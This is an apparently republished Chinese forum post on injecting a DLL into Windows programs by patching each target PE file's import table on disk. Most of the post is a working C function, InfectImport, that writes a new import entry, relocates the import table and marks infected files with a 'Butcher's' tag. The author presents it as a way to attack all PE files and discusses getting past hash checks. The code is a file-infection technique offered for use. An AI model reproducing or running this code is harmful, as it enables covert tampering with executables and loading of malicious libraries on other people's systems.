

# 感染 PE 增加导入项实现注入

> 原文：[`www.pediy.com/kssd/pediy12/141950.html`](https://www.pediy.com/kssd/pediy12/141950.html)

  
  
之前有朋友说此方法还不够通用.原因有个别国外程序会启动后,对自身加载的所有文件进行 HASH 效验,不过它可以检测自带的文件.难道连系统文件也效验.先判断当前系统.   
  
再取得微软的效验?这强度未免太大了吧. 我一个人实在没有那么多精力测试.希望朋友们帮忙.   
  
微软的 Detours 也在使用这种方法注入,我的和它的有一点区别.它的比较温柔.主要攻击 EXE,启动进程挂起.然后修改动态 PE.我攻击所有 PE 文件.静态修改.   
  
  
编程语言:C   
  
编程环境:Microsoft Visual Studio 2008   
  
系统平台:Windows server 2008   
  
实现原理:   
  
启动进程系统是通过其导入表确定该为其加载那些动态连接库.它是一个数组.每个成员代表一个动态连接库.我们要做的就是为这个数组增加一个成员.  
  
而这个成员就是我们的动态连接库.只是这个数组是固定大小的,它的前面后面.都没有位置让我们新增一个成员.所以我们只能随便找一个空地新构造一个这样的数组即可  
  
  
  
  
  
  

代码:

```

函数名称:InfectImport

函数返回:true or false

第一参数:目标文件路径

第二参数:将注入的动态连接库

int InfectImport(const char\* Path,const char\* Library)
{
  char          Sign\[0x10\]={0};
  FILE\*          File=0x0;
  char\*          Buffer=0x0;
  const char\*        Test=TEXT("Butcher's");
  unsigned long        Size=0;
  unsigned long        Offset=0;
  IMAGE\_DOS\_HEADER      Dos={0};
  IMAGE\_NT\_HEADERS      NT={0};
  IMAGE\_SECTION\_HEADER      Section={0};
  IMAGE\_IMPORT\_DESCRIPTOR\*    Import=0;
  IMAGE\_DATA\_DIRECTORY\*      Directory=0;

  //申请所需的局部变量并为其初始化

  if (fopen\_s(&File,Path,TEXT("rb+"))!=0)
  {
    return 0;
  }

  //以读写权限打开目标文件

  \_\_try
  {
    \_\_try
    {
      fread(&Dos,sizeof(IMAGE\_DOS\_HEADER),1,File);
      if (Dos.e\_magic!= IMAGE\_DOS\_SIGNATURE)
      {
        return 0;
      }

      //读取文件 DOS 头到缓存,并判断 DOS 签名

      fseek(File,0x28,SEEK\_SET);
      fread(Sign,0x10,1,File);
      if (strcmp(Test,Sign)==0)
      {
        return 0;
      }

      //读取文件第 28 字节处到缓存,此为 IMAGE\_DOS\_HEADER 结构 e\_res2\[10\]域的位置.
                                                //原为微软定义的保留位.就是微软还没想好用这个地方做点什么,只是空一个空留着以后想到了再用.
      //那它现在不用,我们就拿来用一下.用来做效验.判断当前文件是否已经被感染过了.如没有才继续

      fseek(File,Dos.e\_lfanew,SEEK\_SET);
      fread(&NT,sizeof(IMAGE\_NT\_HEADERS),1,File);
      if (NT.Signature!=IMAGE\_NT\_SIGNATURE)
      {
        return 0;
      }

      //读取文件 NT 头到缓存,并判断 NT 签名

      fseek(File,Dos.e\_lfanew+sizeof(IMAGE\_NT\_HEADERS)+sizeof(IMAGE\_SECTION\_HEADER),SEEK\_SET);
      fread(&Section,sizeof(IMAGE\_SECTION\_HEADER),1,File);
      if (Section.VirtualAddress!=NT.OptionalHeader.BaseOfData)
      {
        return 0;
      }

      //读取文件 rdata 节到缓存,并判断正确性.

      Size=NT.OptionalHeader.DataDirectory\[1\].Size;
      if (Size+0x20>Section.SizeOfRawData-Section.Misc.VirtualSize)
      {
        return 0;
      }

      //获取文件导入表尺寸,并判断 rdata 节剩余空间是否能容纳新增一个导入项的新导入表.

      Offset=Section.PointerToRawData+Section.Misc.VirtualSize;

      //获取节空隙起始位置

      Buffer=calloc(0x20,sizeof(char));
      memset(Buffer,0,0x20);
      strcpy\_s((char\*)Buffer,strlen(Library)+1,Library);
      \*(int\*)((int)Buffer+0x10)=0x80000001;
      \*(int\*)((int)Buffer+0x14)=0x0;
      \*(int\*)((int)Buffer+0x18)=0x0;
      \*(int\*)((int)Buffer+0x1c)=0x0;
      
      //申请 20 字节堆,用以构造新导入项结构

      fseek(File,Offset,SEEK\_SET);
      fwrite(Buffer,sizeof(char),0x20,File);

      //把新构造的导入项结构写入文件 rdata 节空隙起始位置

      Import=malloc(sizeof(IMAGE\_IMPORT\_DESCRIPTOR));
      Import->FirstThunk      =Offset+0x10;
      Import->ForwarderChain    =0;
      Import->Name      =Offset;
      Import->OriginalFirstThunk    =Offset+0x18;
      Import->TimeDateStamp    =0;

      //申请堆,用以构造新导入项.

      fseek(File,NT.OptionalHeader.DataDirectory\[1\].VirtualAddress+Size-0x14,SEEK\_SET);
      fwrite(Import,sizeof(IMAGE\_IMPORT\_DESCRIPTOR),1,File);

      //在文件导入表结尾处写入新构造的导入项

      Buffer=realloc(Buffer,Size);
      memset(Buffer,0,Size);
      fseek(File,NT.OptionalHeader.DataDirectory\[1\].VirtualAddress,SEEK\_SET);
      fread(Buffer,sizeof(char),Size,File);
      fseek(File,Offset+0x20,SEEK\_SET);
      fwrite(Buffer,sizeof(char),Size,File);

      //复制新导入表到新位置

      Directory=malloc(sizeof(IMAGE\_DATA\_DIRECTORY));
      Directory->Size        =Size+0x14;
      Directory->VirtualAddress      =Offset+0x20;
      fseek(File,Dos.e\_lfanew+sizeof(IMAGE\_NT\_HEADERS)-0x78,SEEK\_SET);
      fwrite(Directory,sizeof(IMAGE\_DATA\_DIRECTORY),1,File);

      //修改文件目录使导入表指向新位置,报告新尺寸

      fseek(File,0x28,SEEK\_SET);
      fwrite(Test,strlen(Test),1,File);

      //成功后在文件第 28 字节处,也就是 IMAGE\_DOS\_HEADER 结构 e\_res2\[10\]域的位置写入我们自定义的感染标志.这里标志为：Butcher's
    }
    \_\_except(EXCEPTION\_EXECUTE\_HANDLER)
    {
      return 0;
    }
  }
  \_\_finally
  {
    free(Buffer);
    free(Import);
    free(Directory);
    fclose(File);
  }
  return 1;
} 

```

  
  
  
**PS:此代码居然破坏性.请先备份目标文件再行使用 （使用前请把想要注入的动态连接库放入与目标相同的文件夹内）**